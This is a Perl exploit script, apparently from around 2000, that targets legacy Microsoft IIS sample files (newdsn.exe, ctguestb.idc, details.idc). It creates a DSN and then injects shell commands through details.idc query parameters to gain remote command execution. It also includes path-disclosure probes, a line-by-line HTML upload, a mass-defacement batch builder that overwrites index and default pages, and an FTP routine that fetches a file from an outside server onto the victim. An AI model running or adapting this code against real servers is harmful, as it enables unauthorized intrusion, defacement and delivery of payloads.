#!/usr/bin/perl
#####################################################################
# NewDSN.exe/CTGuestB.idc/Details.idc exploit by Scrippie/Phreak.nl #
#####################################################################
  # DO NOT DISTRIBUTE! # DO NOT DISTRIBUTE! # DO NOT DISTRIBUTE! #
  ################################################################
	# Fuck JP # Version 1.3 # Fuck Meinel #
################################################           
# Part of this source has been ripped from RFP #
# Exploit idea also by RFP                     ######################
# Much love to: Maja, Dopey, Hester            #                    #
# Cheers to: #phreak.nl                        #  Maja, I love you  #
################################################                    #
# Things added/fixed since version 1.0         ################################
# - Forced Command Mode                        # Mail me at: ronald@grafix.nl #
# - Easy uploading of .html files              ################################
# - Checking for .idc files fixed                                             #
# - Output of hard path dumps has been cleaned up                             #
###############################################################################
# Things added/fixed since version 1.1                                     # 
# - Mass deface option (coded to please my valentine :)                    #
# - Fixed some more bugs in .idc recognition (I'm a moron)                 #
# - Cleaned up hard path output some more                                  #
############################################################################
# Things added/fixed since version 1.2                  #
# - Uploading of files via ftp added :)                 #
# - Now uses chr() to make sure all chars can be echoed #
######################################################### 
# ToDo                             #
# <Xphere> gebruik ord( liever     #
# <Xphere> gebruik ord() liever    #
# <Xphere> #weeh = ord($char);     #
# <Xphere> $weeh = ord($char);     #
# <Xphere> krijg je nummer         #
####################################

use Socket;
use Getopt::Std;

getopts("wcdh:u:fm:g:", \%args);

print("NewDSN exploit v 1.2 -- Scrippie / Phreak.nl\n\n");
if (!defined $args{h}) {
print("Usage: dsnhack.pl -h <host>\n");
print("\t-c                      = create a new M\$ Access DSN (Web SQL)\n");
print("\t-d                      = dump hard path by using several flaws\n");
print("\t-f                      = Force command (skip checks for .idc's)\n");
print("\t-g <server:filename>    = Upload file to NT box via FTP\n");
print("\t-h <host>               = host you want to scan (ip or domain)\n");
print("\t-u <filename>           = Upload HTML file (easy defacing)\n");
print("\t-w                      = Win 95 support\n");
print("\t-m <dir /s /b file>     = Mass deface (see documentation)\n");
exit; }

$host = $args{h};
$target = inet_aton($host) || die("inet_aton problems; host doesn't exist?");

if(defined $args{d}) {
   print("* [ Trying to get the hard path with the .idc flaw ] *\n\n   ");
   $temp = &idc_bug;
   if($temp ne "") { print $temp; }
      else { print "Failed..."; }
   print("\n\n* [ Trying to get the hard path with the .ida flaw ] *\n\n   ");
   $temp = &ida_bug;
   if($temp ne "") { print $temp; }
      else { print "Failed..."; }
   print("\n\n* [ Trying to get the hard path with the .pl flaw ] *\n\n   ");
   $temp = &pl_bug;
   if($temp ne "") { print("$temp\n"); }
     else { print "Failed...\n"; }
   exit;
}

if(defined $args{g}) {
	&upload_file($args{g});
	exit;
}

if(defined $args{u}) {
   open(HTMLFILE, "<" . $args{u}) or die "Cannot open $args{u}: $!\n";
   print("* Now uploading: $args{u} to C:\\phreak.htm on $args{h}\n  ");
   while(<HTMLFILE>) {

      s/([<^>])/^$1/g;		# Escape using the WinNT ^ escape char
      s/([\x0D\x0A])//g;        # Filter \r, \n chars
      s/\|/\^\|chr\(124\)\|/g;  # Convert | chars
      s/\"/\^\|chr\(34\)\|/g;   # Convert " chars
      s/\&/\^\|chr\(38\)\|/g;   # Convert & chars

      if($_ ne "") {
         $upcmd = "cmd /c echo " . $_ . " >> C:\\phreak.htm";
         &exec_cmd($upcmd);
      }
   }
   print("Done!\n");
   close(HTMLFILE);
   exit;
}

if(defined $args{m}) {
  &list_deface_bat($args{m});
  exit;
}

if(defined $args{c}) {

   if(!defined $args{f}) {
      print("* [Checking for necessary files] *\n\n");
      &check_cgis;
   }
   else { print("* Forced command mode on - Skipping checks\n"); }

   print("\n* Now trying to create \"Web SQL\" DSN... ");
   if(&make_dsn == 0) { print("<failed> *\n"); exit; }
      else { print("<success> *\n"); }

   print("\nInitializing GuestBook by GETting ctguestb.idc\n");
   &init_gb;
}
else {
   if(!defined $args{f}) {
      print("Checking for: details.idc\t-- ");
      if(&check_details == 0) { print("Not Found :\(\n"); exit; }
         else { print("Found :\)\n"); }
   }
   else { print("* Forced command mode on - Skipping checks\n"); }
}

if (defined $args{w}) { $comm="command /c"; } else { $comm="cmd /c"; }

print("\nType the command line you want to run ($comm assumed):\n");
print("$comm ");

$in=<STDIN>;
chomp $in;
$command="$comm " . $in ;

&exec_cmd($command);

######################################
# Execute $command using details.idc #
######################################
sub exec_cmd {
my ($command) = @_;
$command =~ s/\s/\+/g;	# Convert spaces to plusses (%20 will also work)

sendraw("GET /scripts/samples/details.idc?Fname=hi&Lname=|shell(\"$command\")|"
      . " HTTP/1.0\n\n");
}

###########################################
# Upload a .bat file for mass defacing :) #
###########################################
sub list_deface_bat {
my ($dir_file) = @_;
open(DIRFILE, $dir_file) or die "Cannot open $args{m}: $!\n";
print("--- Go and have a beer - this will take a while\n\n");
while(<DIRFILE>) {
 s/([\x0A\x0D])//; # Yes, I dislike chop() - it doesn't cope with \r\n newlines
		   # in a *nix environment

 if(/index\.htm/ || /index\.asp/ || /default\.htm/ || /default\.asp/ ||
    /home\.htm/ || /home\.asp/ || /main\.htm/ || /main\.asp/ || /inhoud.\htm/
    || /inhoud\.asp/ || /index\.stm/) {

    print("    Adding $_ to our mass deface batch file\n");
    &exec_cmd("cmd /c echo copy C:\\phreak.htm $_ >> c:\\phjear.bat");
 }

}
  print("\n* Behave and don't run C:\\phjear.bat You Filthy ScR|pT K1dx0r!\n");
  print("  Oh, did you know this stuff is VERY easy to spot in the logs? *grin*\n");
}

########################
# Get file via ftp -s: #
########################
sub upload_file {
   my ($foobar) = @_;
   $foobar =~ /(\S+):(\S+)/;

   print("* Uploading ftp script...\n");

   &exec_cmd("cmd /c echo anonymous> C:\\hello.txt");
   &exec_cmd("cmd /c echo SkRiPtKiD\@gerrie.is.mediageil.nl>> C:\\hello.txt");
   &exec_cmd("cmd /c echo get $2>> C:\\hello.txt");
   &exec_cmd("cmd /c ftp -s:C:\\hello.txt $1");

   print("* Fetching file - it can be found in: C:\\WINNT\\SYSTEM32\\$2\n");

}


##################################################
# Initialize the new DSN by GETting ctguestb.idc #
##################################################

sub init_gb {
my @results=sendraw("GET /scripts/samples/ctguestb.idc HTTP/1.0\n\n");
return 0;
}

#################################################################
# Checks if http://somehost.net/scripts/tools/newdsn.exe exists #
#################################################################

sub check_newdsn {
my @results=sendraw("GET /scripts/tools/newdsn.exe HTTP/1.0\n\n");
$results[0]=~m#HTTP\/([0-9\.]+) ([0-9]+) ([^\n]*)#;
return 1 if $2 eq "200";
return 0;
}

#####################################################################
# .idc's are funny...return codes are:                              #
# 200 OK if they exist and DSN is made                              #
# 500 Error performing query if they exist and DSN is NOT made      #
# 200 Error performing query if they don't exist                    #
# Information provided by RFP's whisker                             #
#####################################################################
# Checks if http://somehost.net/scripts/samples/ctguestb.idc exists #
#####################################################################

sub check_ctguestb {
my @results=sendraw("GET /scripts/samples/ctguestb.idc HTTP/1.0\n\n");
$results[0]=~m#HTTP\/([0-9\.]+) ([0-9]+) (\S+) ([^\n\r]*)#;
if ($2 eq "500" || ($2 eq "200" && $3 eq "OK")) { return 1; }
return 0;
}

####################################################################
# Checks if http://somehost.net/scripts/samples/details.idc exists #
####################################################################

sub check_details {
my @results=sendraw("GET /scripts/samples/details.idc HTTP/1.0\n\n");
$results[0]=~m#HTTP\/([0-9\.]+) ([0-9]+) ([^\r\n]*)#;
if ($2 eq "500" || ($2 eq "200" && $3 eq "OK")) { return 1; }
return 0;
}

######################################################################
# Checks out if newdsn.exe, ctguestb.idc and details.idc are present #
######################################################################

sub check_cgis {
print("\tChecking for: newdsn.exe\t-- ");
if(&check_newdsn == 0) { print("Not Found :\(\n"); exit; }
else { print("Found :\)\n"); }
print("\tChecking for: ctguestb.idc\t-- ");
if(&check_ctguestb == 0) { print("Not Found :\(\n"); exit; }
else { print("Found :\)\n"); }
print("\tChecking for: details.idc\t-- "); 
if(&check_details == 0) { print("Not Found :\(\n"); exit; }
else { print("Found :\)\n"); }
}

#########################################
# Make a DSN with the name of "Web SQL" #
#########################################

sub make_dsn {
my @results=sendraw("GET /scripts/tools/newdsn.exe?driver=Microsoft\%2B" .
        "Access\%2BDriver\%2B\%28*.mdb\%29\&dsn=Web\%20SQL\&dbq=" .
	"C\%3A\%5Cfoobar.mdb\&newdb=CREATE_DB\&attr= HTTP/1.0\n\n");
$results[0]=~m#HTTP\/([0-9\.]+) ([0-9]+) ([^\n]*)#;
if($2 eq "200") {
  foreach $line (@results) {
    return 1 if $line=~/<H2>Datasource creation successful<\/H2>/;}}
 return 0;}

######################################
# Use .idc flaw to get absolute path #
######################################

sub idc_bug {
my @results=sendraw("GET /blaat.idc HTTP/1.0\n\n");
@results=grep(/[A-Z]:\\\S*/, @results);
$results[0] =~ /([A-Z]:\\\S*)blaat.idc/;
return $1;
}

######################################
# Use .ida flaw to get absolute path #
######################################

sub ida_bug {
my @results=sendraw("GET /blaat.ida HTTP/1.0\n\n");
@results=grep(/([A-Z]:\\\S*)/, @results);
$results[0] =~ /([A-Z]:\\\S*)blaat.ida/;
return $1;
}

#####################################
# Use .pl flaw to get absolute path #
#####################################

sub pl_bug {
my @results=sendraw("GET /blaat.pl HTTP/1.0\n\n");
@results=grep(/[A-Z]:\\/,@results);
$results[0] =~ /([A-Z]:\\\S*)blaat.pl/;
return $1;
}

##############################
# Encode data in HTTPd style #
##############################

sub hex_encode {
   my ($stringz) = @_;

   foreach $char (@stringz)
   {
      printf("%lx", $char[0]);
   }
}

######################################################
# Send data over a TCP port 80 connection to $target #
######################################################

sub sendraw {   # this saves the whole transaction anyway
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,80,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;
                        print STDOUT "." if(defined $args{X});}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}

